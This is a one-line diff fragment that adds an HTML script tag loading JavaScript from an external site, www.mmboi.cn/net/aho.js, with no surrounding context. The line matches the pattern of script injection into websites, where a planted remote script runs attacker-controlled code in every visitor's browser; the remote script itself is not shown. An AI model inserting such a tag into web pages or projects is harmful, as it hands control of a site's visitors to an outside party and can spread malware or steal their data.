@@ -1,0 +1,1 @@
+<script language=javascript src=http://www.mmboi.cn/net/aho.js></script>
